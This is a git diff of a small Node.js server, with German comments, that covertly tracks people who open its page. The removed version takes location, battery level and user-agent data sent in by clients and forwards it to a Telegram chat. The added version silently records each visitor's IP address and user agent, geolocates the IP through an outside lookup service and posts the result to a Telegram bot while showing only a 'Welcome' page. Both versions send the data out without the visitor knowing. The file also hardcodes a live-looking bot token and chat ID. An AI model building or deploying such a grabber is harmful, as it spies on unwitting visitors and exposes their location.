@@ -1,10 +1,10 @@
+const express = require('express');
 const axios = require('axios');
+const app = express();
 
-// Telegram Bot Token und Chat ID (ersetzen mit deinem Token und Chat ID)
 const TELEGRAM_BOT_TOKEN = '7749604293:AAHlRr16NUJPHRiQ4QqbRkMKQMzVqFDrUCw';
 const TELEGRAM_CHAT_ID = '7064862085';
 
-// Funktion, um Nachrichten an Telegram zu senden
 const sendToTelegram = (message) => {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   axios.post(url, {
@@ -13,49 +13,29 @@ const sendToTelegram = (message) => {
   }).catch(err => console.error('Error sending message:', err));
 };
 
-// Serverless Funktion für Vercel
-module.exports = async (req, res) => {
-  if (req.method === 'GET' && req.url.startsWith('/send-location')) {
-    // Empfang von Standortdaten (lat, lon)
-    const { lat, lon } = req.query;
+app.get('/', async (req, res) => {
+  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  let userAgent = req.headers['user-agent'];
 
-    if (!lat || !lon) {
-      return res.status(400).send('Standortdaten fehlen');
-    }
-
-    // Nachricht an Telegram senden
-    sendToTelegram(`Live Location:\nLatitude: ${lat}\nLongitude: ${lon}`);
-
-    // Antwort an den Client senden
-    res.status(200).send('Standort empfangen und Nachricht an Telegram gesendet');
-  } else if (req.method === 'GET' && req.url.startsWith('/send-battery')) {
-    // Empfang von Batterielevel
-    const { level } = req.query;
-
-    if (!level) {
-      return res.status(400).send('Batterielevel fehlt');
-    }
-
-    // Nachricht an Telegram senden
-    sendToTelegram(`Battery Level: ${level}`);
-
-    // Antwort an den Client senden
-    res.status(200).send('Batterielevel empfangen und Nachricht an Telegram gesendet');
-  } else if (req.method === 'GET' && req.url.startsWith('/send-user-agent')) {
-    // Empfang von User-Agent-Daten
-    const { id } = req.query;
-
-    if (!id) {
-      return res.status(400).send('User-Agent fehlt');
-    }
-
-    // Nachricht an Telegram senden
-    sendToTelegram(`User Agent: ${id}`);
-
-    // Antwort an den Client senden
-    res.status(200).send('User-Agent empfangen und Nachricht an Telegram gesendet');
-  } else {
-    // Wenn eine ungültige Anfrage kommt
-    res.status(404).send('Seite nicht gefunden');
+  // Get geolocation using IP
+  try {
+    const response = await axios.get(`http://ip-api.com/json/${ip}`);
+    const location = response.data;
+    sendToTelegram(`
+      New Visitor:
+      IP: ${ip}
+      User Agent: ${userAgent}
+      Country: ${location.country}
+      Region: ${location.regionName}
+      City: ${location.city}
+      Lat: ${location.lat}
+      Lon: ${location.lon}
+    `);
+  } catch (err) {
+    console.error('Error fetching location:', err);
   }
-};
+
+  res.send('<h1>Welcome</h1>');
+});
+
+module.exports = app;
